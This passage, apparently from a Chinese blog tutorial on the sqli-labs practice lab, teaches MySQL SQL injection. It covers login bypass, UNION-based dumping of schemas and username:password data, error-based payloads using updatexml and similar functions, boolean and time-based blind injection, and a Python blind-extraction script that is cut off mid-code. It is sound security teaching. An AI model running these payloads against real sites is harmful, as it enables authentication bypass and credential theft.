此时我们输入 id&#x3D;3&#39;-- + 页面即可恢复正常，-- +注释掉了后边的语句，使sql能够正常执行
# 得出结论：存在注入点为 id ，闭合符号为 单引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h5><p>正常的后台sql语句：</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;SELECT * FROM users WHERE username &#x3D; &#39;$username&#39; and password &#x3D;&#39;$password&#39; limit 0,1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在mysite网站中输入恶意字符 单引号 ‘ 提交数据 username=admin’ or 1# &amp;password=123 , sql语句变成：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#' and password = '$password'limit 0,1;</span>

去掉被注释的内容，<span class="token keyword">sql</span>语句如下：

<span class="token comment"># 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token number">1</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'123'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#' limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="3-注入sql语句"><a href="#3-注入sql语句" class="headerlink" title="3.注入sql语句"></a>3.注入sql语句</h4><p>找到注入点以后，我们就可以执行相应的sql语句，来获取数据库中的信息</p>
<h5 id="UNION联合查询注入"><a href="#UNION联合查询注入" class="headerlink" title="UNION联合查询注入"></a>UNION联合查询注入</h5><p>联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users union all select user(),database(),version();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h5><p>要注意的是联合查询前后两条 select 语句查询数据的列数是相等的，故需要使用 order by 语句来判断注入点sql语句查询的列数是多少</p>
<p>order by 排序超过查询结果列数的时候就会抛出错误，故可以使用它来判断前一条 select 语句查询结果的列数</p>
<p><img src="/2023/012220963/44.PNG" alt="44"></p>
<h6 id="二分法查找列数"><a href="#二分法查找列数" class="headerlink" title="二分法查找列数"></a>二分法查找列数</h6><p>先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数</p>
<h3 id="查询数据库内容常见语句"><a href="#查询数据库内容常见语句" class="headerlink" title="查询数据库内容常见语句"></a>查询数据库内容常见语句</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.暴库：select group_concat(schema_name) from information_schema.schemata;

2.暴表1：select group_concat(table_name) from information_schema.tables where
table_schema&#x3D;&#39;security&#39;; 加引号
  暴表2：select table_name from information_schema.tables where
table_schema&#x3D;&#39;security&#39; limit 3,1; 加引号

3.暴字段1：select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号
暴字段2：select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;

4.暴字段值：select group_concat(username,0x3a,password) from security.users; 不加引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="联合查询暴库-amp-amp-暴数据"><a href="#联合查询暴库-amp-amp-暴数据" class="headerlink" title="联合查询暴库&amp;&amp;暴数据"></a>联合查询暴库&amp;&amp;暴数据</h4><p>暴库是查找所有数据库名的意思，mysql的注入可以从 information_schema 数据库中查询所有表的结构(库名、表名、字段名)信息</p>
<h5 id="sql-less1暴库"><a href="#sql-less1暴库" class="headerlink" title="sql-less1暴库"></a>sql-less1暴库</h5><p>由于回显位置可能被前一句 select 查到的结果占用，此时需要修改参数，让前一条 select 语句返回空结果，我们拼接的 select 的查询结果就会显示出来了</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(schema_name) from information_schema.schemata; # 查询所有库名，并拼接为一条数据

payload: id&#x3D;-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="sql-less1爆表"><a href="#sql-less1爆表" class="headerlink" title="sql-less1爆表"></a>sql-less1爆表</h5><p>获取指定数据库中所有表的名字</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;; # 查询security库中所有表名，并拼接为一条数据

payload: id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from
information_schema.tables where table_schema&#x3D;&#39;security&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="sql-less1暴字段"><a href="#sql-less1暴字段" class="headerlink" title="sql-less1暴字段"></a>sql-less1暴字段</h5><p>获取指定库的指定表中的所有字段值</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; # 查询 security 库中 users 表中的
所有字段值，拼接为一条数据

payload: id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="sql-less1暴数据"><a href="#sql-less1暴数据" class="headerlink" title="sql-less1暴数据"></a>sql-less1暴数据</h5><p>获取数据库中的数据</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(username,0x3a,password) from security.users; # 查询指定库中表
的某些字段值

payload: id&#x3D;-1&#39; union select 1,2,group_concat(username,0x3a,password) from security.users -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="SQL注入漏洞2"><a href="#SQL注入漏洞2" class="headerlink" title="SQL注入漏洞2"></a>SQL注入漏洞2</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面<strong>能够抛出报错</strong>的代码信息，就可以<strong>利用报错回显</strong>，来查看注入的sql语句的执行结果</p>
<h4 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 1.floor()
select * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a);
# 2.extractvalue()
select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
# 3.updatexml()
select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
# 4.geometrycollection()
select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));
# 5.multipoint()
select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));
# 6.polygon()
select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));
# 7.multipolygon()
select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));
# 8.linestring()
select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));
# 9.multilinestring()
select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));
# 10.exp()
select * from test where id&#x3D;1 and exp(~(select * from(select user())a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="函数报错原理"><a href="#函数报错原理" class="headerlink" title="函数报错原理"></a>函数报错原理</h4><h5 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (select 1 from (select
count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>floor()报错注入的原因是<strong>group by</strong>在向临时表插入数据<strong>时，由于</strong>rand()多次计算导致插入临时表时主键重复<strong>，从而报错，又因为报错前</strong>concat()<strong>中的SQL</strong>语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果</p>
<p>该函数最大显示长度为64，超过长度可以配合substr、limit等函数来显示</p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从目标XML中返回包含所查询值的字符串，如果Xpath格式语法书写错误的话，就会报错</p>
<p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>updatexml的第二个参数需要Xpath格式的字符串，是用/xxx/xxx/xxx/…这种格式，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出</p>
<p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p>
<h4 id="sqli-less5注入"><a href="#sqli-less5注入" class="headerlink" title="sqli-less5注入"></a>sqli-less5注入</h4><p>输入参数 id=1 发现没有查询结果的回显</p>
<p><img src="/2023/012220963/45.PNG" alt="45"></p>
<h5 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h5><p>输入单引号后报错根据报错信息可知，闭合符号为单引号且非常重要的一点是，该页面能够抛出sql语句的报错信息</p>
<p><img src="/2023/012220963/46.PNG" alt="46"></p>
<h5 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h5><p>进行 union select 注入测试后发现没有结果回显，但因为页面能抛出报错信息，故选用报错注入</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/47.PNG" alt="47"></p>
<h5 id="暴库-amp-amp-暴数据"><a href="#暴库-amp-amp-暴数据" class="headerlink" title="暴库&amp;&amp;暴数据"></a>暴库&amp;&amp;暴数据</h5><p>暴库或者暴数据的时候可能会遇到一些问题，sql语句的查询结果很长，但是updatexml函数只能抛出32位长度的报错信息，这个时候就要用到substr函数分段截取显示结果 或者 limit 逐行显示结果<strong>substr(str, start, length)</strong> 注意索引从 1 开始，每次截取 32 位，第二次索引从 32 开始再截取 32 位，以此类推</p>
<h6 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h6><p><strong>substr(substring,mid,left)</strong></p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
group_concat(schema_name) from information_schema.schemata),0,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/48.PNG" alt="48"></p>
<p>limit</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select schema_name from information_schema.schemata limit 0,1),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/49.PNG" alt="49"></p>
<h6 id="暴表"><a href="#暴表" class="headerlink" title="暴表"></a>暴表</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
group_concat(table_name) from information_schema.tables where 
table_schema&#x3D;&#39;security&#39;),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h6 id="暴字段"><a href="#暴字段" class="headerlink" title="暴字段"></a>暴字段</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
group_concat(column_name) from information_schema.columns where 
table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h6 id="暴数据"><a href="#暴数据" class="headerlink" title="暴数据"></a>暴数据</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
group_concat(username,0x3a,password) from security.users),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息</p>
<h4 id="sqli-less8"><a href="#sqli-less8" class="headerlink" title="sqli-less8"></a>sqli-less8</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p>
<h4 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id = 1’ and 1 – +</strong> <strong>页面内容显示正常</strong></p>
<p><img src="/2023/012220963/50.PNG" alt="50"></p>
<p><strong>输入</strong> <strong>id = 1’ and 0 – +</strong> <strong>页面显示不正常</strong></p>
<p><img src="/2023/012220963/51.PNG" alt="51"></p>
<p><strong>由此判断出闭合符号位单引号</strong></p>
<h4 id="查询数据内容"><a href="#查询数据内容" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>
<p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and length(database())&#x3D;8 -- + # 判断当前数据库名长度<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>substr() \ left() 函数 截取查询结果字符进行判断</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and substr(database(),1,1)&#x3D;&#39;a&#39; -- + # 使用指定字符一位一位判断截取到的字符
and left(database(),8)&#x3D;&#39;security&#39; -- + # 截取指定长度结果，进行判断

# 可使用ascii函数，查询截取到字符的ascii码
ascii(substr(database(),1,1))&#x3D;115 -- + # 使用ascii码一位一位比对截取到的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="burp盲注爆破"><a href="#burp盲注爆破" class="headerlink" title="burp盲注爆破"></a>burp盲注爆破</h4><p>标记参数</p>
<p><img src="/2023/012220963/52.PNG" alt="52"></p>
<p>payload1是 1-8 的数字</p>
<p><img src="/2023/012220963/53.PNG" alt="53"></p>
<p>payload2 是0~9、a-z、以及一些常见字符</p>
<p><img src="/2023/012220963/54.PNG" alt="54"></p>
<p>结果判断条件</p>
<p><img src="/2023/012220963/55.PNG" alt="55"></p>
<p>根据响应包来判断每一位字符,按顺序拼凑起来结果是 security</p>
<p><img src="/2023/012220963/56.PNG" alt="56"></p>
<p><strong>在进行暴库&amp;&amp;暴数据时都要先判断sql查询结果的长度，可以用二分法快速判断</strong></p>
<p>例如判断所有库名的长度</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and length((select group_concat(schema_name) from 
information_schema.schemata))&lt;200 -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="暴库-1"><a href="#暴库-1" class="headerlink" title="暴库"></a>暴库</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(schema_name) from 
information_schema.schemata),1,1)&#x3D;&#39;i&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(table_name) from 
information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;e&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="暴字段-1"><a href="#暴字段-1" class="headerlink" title="暴字段"></a>暴字段</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(column_name) from 
information_schema.columns where table_name&#x3D;&#39;users&#39; and 
table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;i&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="暴数据-1"><a href="#暴数据-1" class="headerlink" title="暴数据"></a>暴数据</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(username,0x3a,password) from security.users),1,1)&#x3D;&#39;d&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p>
<h4 id="sqli-less9"><a href="#sqli-less9" class="headerlink" title="sqli-less9"></a>sqli-less9</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p>
<h4 id="判断闭合符号-1"><a href="#判断闭合符号-1" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id=1’ and sleep(3) – +</strong> <strong>页面有3秒延时</strong></p>
<p><img src="/2023/012220963/57.PNG" alt="57"></p>
<p><strong>由此判断出闭合符号位单引号</strong></p>
<h4 id="查询数据内容-1"><a href="#查询数据内容-1" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>
<p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and if(length(database()) &#x3D; 8, sleep(3),1) -- + # 判断当前数据库名长度<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>substr() \ left() 函数 截取查询结果字符进行判断</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and if(substr(database(),1,1) &#x3D; &#39;s&#39;, sleep(3),1) -- + # 使用指定字符一位一位判断截取
到的字符
and if(left(database(),8)&#x3D;&#39;security&#39;, sleep(3),1) -- + # 截取指定长度结果，进行判断
# 可使用ascii函数，查询截取到字符的ascii码
and if(ascii(substr(database(),1,1))&#x3D;115, sleep(3),1) -- + # 使用ascii码一位一位比对
截取到的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="burp延时爆破"><a href="#burp延时爆破" class="headerlink" title="burp延时爆破"></a>burp延时爆破</h4><p><strong>与burp盲注爆破类似</strong></p>
<h5 id="暴库-2"><a href="#暴库-2" class="headerlink" title="暴库"></a>暴库</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)&#x3D;&#39;i&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;e&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="暴字段-2"><a href="#暴字段-2" class="headerlink" title="暴字段"></a>暴字段</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and 
table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;i&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="暴数据-2"><a href="#暴数据-2" class="headerlink" title="暴数据"></a>暴数据</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and if((substr((select group_concat(username,0x3a,password) from security.users),1,1)&#x3D;&#39;d&#39;),sleep(3),1) -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="SQL注入漏洞3"><a href="#SQL注入漏洞3" class="headerlink" title="SQL注入漏洞3"></a>SQL注入漏洞3</h2><h3 id="盲注脚本编写"><a href="#盲注脚本编写" class="headerlink" title="盲注脚本编写"></a>盲注脚本编写</h3><p>注意：在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可</p>
<p>根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断</p>
<h4 id="sqli-less8盲注脚本1"><a href="#sqli-less8盲注脚本1" class="headerlink" title="sqli-less8盲注脚本1"></a>sqli-less8盲注脚本1</h4><p><strong>less8.py</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-8/?id=1' and ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string"> -- +"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    flag <span class="token operator">=</span> <span class="token boolean">True</span>
                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">return</span> result
get_info<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="requests超时重发"><a href="#requests超时重发" class="headerlink" title="requests超时重发"></a>requests超时重发</h4><p>有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
time1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.google.com"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"耗时</span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="sqli-less8盲注脚本2-超时重发"><a href="#sqli-less8盲注脚本2-超时重发" class="headerlink" title="sqli-less8盲注脚本2(超时重发)"></a>sqli-less8盲注脚本2(超时重发)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>
session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>
